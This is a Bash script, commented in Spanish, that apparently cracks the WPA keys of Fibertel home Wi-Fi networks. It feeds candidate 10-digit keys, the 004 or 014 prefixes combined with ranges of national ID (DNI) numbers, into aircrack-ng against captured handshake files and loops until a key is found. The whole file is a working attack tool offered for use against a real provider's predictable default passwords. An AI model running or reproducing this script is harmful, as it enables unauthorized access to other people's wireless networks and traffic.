#!/bin/bash

echo "Ejecutar este script en screen, fibertel 10 digitos"
# $1 ESSID
# $2 file  ejemplo "0XX-01"
# $3 DNI start ejemplo "27"
#echo "benchmark......"
#aircrack-ng -S
#echo "0" > key

test -f key || echo "0" > key

num=$(($3))
num=$(($num * 100000))
up=$(($num + 100000))
dn=$(($num - 100000))
counter=0

while [ $(cat key) = "0" ]
  do
    #10 digitos, 004, up
    seq -w 004"$(($num + $counter))" 004"$(($up + $counter))" | aircrack-ng -l key -e "$1" -w - caps/"$2".cap
    if [ $(cat key) != "0" ]
    then
      rm dic
      exit 0
    fi
    #10 digitos, 014, up
    seq -w 014"$(($num + $counter))" 014"$(($up + $counter))" | aircrack-ng -l key -e "$1" -w - caps/"$2".cap
    if [ $(cat key) != "0" ]
    then
      rm dic
      exit 0
    fi

  #10 digitos, 004, dn
  seq -w 004"$(($dn - $counter))" 004"$(($num - $counter))" | aircrack-ng -l key -e "$1" -w - caps/"$2".cap
  if [ $(cat key) != "0" ]
  then
    rm dic
    exit 0
  fi
  #10 digitos, 014, dn
  seq -w 014"$(($dn - $counter))" 014"$(($num - $counter))" | aircrack-ng -l key -e "$1" -w - caps/"$2".cap
  if [ $(cat key) != "0" ]
  then
    rm dic
    exit 0
  fi

  counter=$(($counter + 100000))

done

echo "Remove key file, and run again"
